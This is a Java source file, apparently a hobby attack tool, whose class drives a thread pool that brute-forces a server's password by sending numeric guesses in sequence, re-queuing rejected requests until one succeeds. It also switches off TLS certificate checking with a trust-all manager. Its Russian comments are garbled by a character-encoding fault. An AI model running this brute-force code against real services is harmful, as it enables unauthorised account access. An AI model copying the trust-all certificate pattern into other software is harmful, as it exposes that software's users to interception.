package com.mycompany.huneiko;

import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.RejectedExecutionException;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

/**
 *  ласс генерирует пароли, инкапсулирует пул потоков, отсылающих
 * запросы на сервер, а также очередь потоков, запросы которых были отвергнуты,
 * дл€ повторного использовани€
 * @author —лава
 *
 */
public class PasswordGenerator {

	/**
	 * пул потоков, каждый из которых отсылает запрос с одним паролем
	 */
    private ThreadPoolExecutor pool = new ThreadPoolExecutor(
    		30, 75, 30, TimeUnit.SECONDS, new LinkedBlockingQueue<Runnable>(1000));
    
    /**
     * очередь потоков с отвергнутыми запросами
     */
    private ConcurrentLinkedQueue<RequestThread> badRequests = new ConcurrentLinkedQueue<>();

    private String password = "0";

    /**
     * метод инициирует работу экзекьютора.
     * ѕул будет работать до тех пор пока принудительно не закроетс€
     * @throws NoSuchAlgorithmException
     * @throws KeyManagementException
     */
    public void attackTheSystem() throws NoSuchAlgorithmException, KeyManagementException {
    	
    	fixCertificate();
    	
        while(!pool.isShutdown()) {
            try {
                pool.execute(getThread());
            } catch(RejectedExecutionException e) {
            	System.out.println(e.getMessage());
            	while(!pool.getQueue().isEmpty()) {
            		
            	}
            	System.out.println("queue is empty");
            }
        }
    }

    /**
     * метод фиксит проблему св€занную с сертификатами.
     * Ѕез этого запросы не посылаютс€
     * @throws NoSuchAlgorithmException
     * @throws KeyManagementException
     */
    private void fixCertificate() throws NoSuchAlgorithmException, KeyManagementException {
    	TrustManager[] trustAllCerts = new TrustManager[] {
                new X509TrustManager() {
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }

                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }

                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }
                }
        };

        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
    }
    
    /**
     * ¬озвращает поток дл€ отправки запроса.
     * Ѕерет из очереди отвергнутых запросов либо
     * формирует новый, если очередь пуста
     * @return
     */
    private RequestThread getThread() {
    	RequestThread thread;
    	
    	if(badRequests.isEmpty()) {
    		password = generatePassword(password);
    		thread = new RequestThread(password, this);
    	} else {
    		thread = badRequests.poll();
    	}
        return thread;
    }

    /**
     * добавл€ет поток с отвергнутым запросом в
     * специальную очередь
     * @param thread
     */
    public void addRequestForRepeat(RequestThread thread) {
    	badRequests.add(thread);
    }

    /**
     * прекращает выполнение всех потоков в пуле.
     * ¬ызываетс€, когда найден подход€щий пароль
     * @param password
     */
    public void terminateGeneration() {
        pool.shutdownNow();
    }

    /**
     * генерирует новый пароль дл€ следующего запроса,
     * инкрементирую предыдущий пароль
     * @param oldPassword
     * @return
     */
    private String generatePassword(String oldPassword) {
        StringBuilder newPassword = new StringBuilder();
        int incr = 1;
        
        for(int i = oldPassword.length() - 1; i >= 0 ; --i) {
            int val = Character.getNumericValue(oldPassword.charAt(i));
            val += incr;
            
            if(val < 10) {
            	incr = 0;
            } else {
                val = 0;
            }
            newPassword.insert(0, val);
        }
        if(incr == 1) {
        	newPassword.insert(0, 0);
        }
        return newPassword.toString();
    }
}
